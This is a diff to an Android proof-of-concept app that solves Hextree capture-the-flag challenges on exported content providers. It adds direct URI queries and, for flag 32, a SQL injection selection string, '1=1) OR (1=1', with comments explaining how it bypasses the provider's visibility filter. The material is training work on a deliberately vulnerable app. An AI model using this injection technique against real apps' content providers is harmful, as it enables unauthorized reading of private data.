@@ -6,6 +6,8 @@ import android.content.Intent
 import android.os.Handler
 import android.os.Looper
 import androidx.core.net.toUri
+import com.vishal2376.hextreepoc.Utils.dumpCursor
+
 
 /**
  * Author: Vishal Singh (vishal2376)
@@ -308,4 +310,88 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 		}
 		context.startActivity(intent)
 	}
+
+
+	// ------------------- Content Providers Flags ------------------------//
+
+	/**
+	 * FLAG 30 - Basic Content Provider Query
+	 * Technique: Direct URI query on exported ContentProvider
+	 *
+	 * Flow:
+	 * 1. Query content://io.hextree.flag30/success
+	 * 2. Provider checks uri.getPath().equals("/success") → passes
+	 * 3. Provider runs SELECT * FROM flag WHERE name='flag30' AND visible=1
+	 * 4. Calls success() → decrypts flag, writes to DB
+	 * 5. Internally starts Flag30Activity with random UUID secret → flag shown
+	 *
+	 * Key insight: Provider ignores our selection parameter entirely — uses
+	 * its own hardcoded WHERE clause with parameterized query (safe from injection).
+	 * Only the URI path matters. Wrong path → returns null, nothing happens.
+	 */
+	fun flag30() {
+		val uri = "content://io.hextree.flag30/success"
+
+		dumpCursor(
+			context = context,
+			uri = uri,
+			title = "Flag 30"
+		)
+	}
+
+
+	/**
+	 * FLAG 31 - Content Provider URI Matching
+	 * Technique: Correct URI pattern to satisfy UriMatcher routing
+	 *
+	 * Flow:
+	 * 1. Query content://io.hextree.flag31/flag/31
+	 * 2. UriMatcher matches "flag/#" pattern → code 2 (FLAG_ID)
+	 * 3. ContentUris.parseId(uri) extracts ID = 31
+	 * 4. Provider checks: if (id == 31) → calls success()
+	 * 5. Internally starts Flag31Activity with UUID secret → flag shown
+	 *
+	 * Key insight: Three URI paths exist — only one works:
+	 * /flags       → code 1 → throws exception (not implemented)
+	 * /flag/{id}   → code 2 → valid, but only id=31 triggers success()
+	 * anything else → IllegalArgumentException
+	 * Must read UriMatcher setup in JADX to find the exact ID required.
+	 */
+	fun flag31() {
+		val uri = "content://io.hextree.flag31/flag/31"
+
+		dumpCursor(
+			context = context,
+			uri = uri,
+			title = "Flag 31"
+		)
+	}
+
+	/**
+	 * FLAG 32 - SQL Injection via Content Provider
+	 * Technique: WHERE clause injection through unsanitized selection parameter
+	 *
+	 * Flow:
+	 * 1. Query /flags URI (UriMatcher code 1) — the only injectable path
+	 * 2. Provider concatenates our selection: "visible=1 AND (" + selection + ")"
+	 * 3. Inject "1=1) OR (1=1" to break out of the AND block
+	 * 4. Final SQL: WHERE visible=1 AND (1=1) OR (1=1) — returns ALL rows
+	 * 5. containsFlag32(cursor) finds flag32 row in results → success()
+	 *
+	 * Key insight: flag32 has visible=0 in DB so "OR 1=1" inside the AND block
+	 * still fails (visible=1 filters it). Must inject AFTER the closing ")" to
+	 * add OR at SQL level — bypassing the entire visible=1 constraint.
+	 */
+	fun flag32() {
+		val uri = "content://io.hextree.flag32/flags"
+
+		dumpCursor(
+			context = context,
+			uri = uri,
+			title = "Flag 32",
+			// Add SQL injection to test selection
+			selection = "1=1) OR (1=1"
+		)
+	}
+
 }
